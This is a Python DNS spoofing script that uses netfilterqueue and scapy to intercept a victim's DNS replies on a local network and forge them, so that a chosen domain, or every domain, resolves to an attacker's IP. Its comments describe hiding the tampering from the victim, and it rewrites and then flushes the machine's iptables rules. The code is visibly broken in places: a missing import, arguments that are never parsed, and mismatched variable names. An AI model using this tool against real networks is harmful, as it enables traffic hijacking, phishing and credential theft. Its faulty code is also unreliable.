#!/usr/bin/python3
from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import os
import sys

targetwebsite = ""
redirectToIP = ""

def processPacket(netfilterPacket):
    '''
    Process packets from the netfilter queue
    '''
    scapyPacket = scapy.IP(netfilterPacket.get_payload()) # Convert netfilter queue packet to a Scapy packet

    if scapyPacket.haslayer(scapy.DNSRR): # If the packet is a DNS Resource Record (DNS Reply), modify the packet
        print(f"[Originial]: {scapyPacket.summary()}")

        try:
            scapyPacket = modifyPacket(scapyPacket)
        except IndexError:
            pass
        
        print(f"[Forged]:{scapyPacket.summary()}")
        netfilterPacket.set_payload(bytes(scapyPacket)) # Convert Scapy packet abck to netfilter packet

    netfilterPacket.accept() # Forward the forged DNS response

def modifyPacket(scapyPacket):

    queryName = scapyPacket[scapy.DNSQR].qname # Extract the query name from the intercepted DNS request
    
    if targetWebsiteName in queryName: # Only works with websites over HTTP
    # Now craft a response that redirects the victim to the attacker's IP address
        answer = scapy.DNSRR(rrname=queryName, rdata=redirectToIP)
        # The above needs a running Apache web server running on redirectToIP:80 with an index.html!
        scapyPacket[scapy.DNS].an = answer      # Swap the query's answer with out answer
        scapyPacket[scapy.DNS].ancount = 1      # Single DNSRR for the victim (applicable when the DNS response consists of many IPs)
        # Clear the length and checksum headers because otherwise, the user will be alarmed to our tampering in processPacket()
        del scapyPacket[scapy.IP].len
        del scapyPacket[scapy.IP].chksum
        del scapyPacket[scapy.UDP].len
        del scapyPacket[scapy.UDP].chksum
    
    return scapyPacket

if __name__ == "__main__":
    
    if os.geteuid() != 0:
            sys.exit("[!] Please run as root")

    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domain", help="Choose the domain to spoof. Example: -d facebook.com")
    parser.add_argument("-r", "--routerIP", help="Choose the router IP. Example: -r 192.168.0.1")
    parser.add_argument("-v", "--victimIP", help="Choose the victim IP. Example: -v 192.168.0.5")
    parser.add_argument("-t", "--redirectto", help="Optional argument to choose the IP to which the victim will be redirected \
                        otherwise defaults to attacker's local IP. Requires either the -d or -a argument. Example: -t 80.87.128.67")
    parser.add_argument("-a", "--spoofall", help="Spoof all DNS requests back to the attacker or use -r to specify an IP to redirect them to", action="store_true")

    QUEUE_NUMBER = 0
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUMBER))
    queue = NetfilterQueue() # Add packets to this queue

    try:
        # Bind the queue to the number and the function to invoke
        queue.bind(QUEUE_NUM, processPacket)
        queue.run()
    except KeyboardInterrupt:
        print("\nCtrl + C pressed, Exiting.")
        print("[-] DNS Spoof Stopped")
        os.system("iptables --flush")  # Restore the iptables rule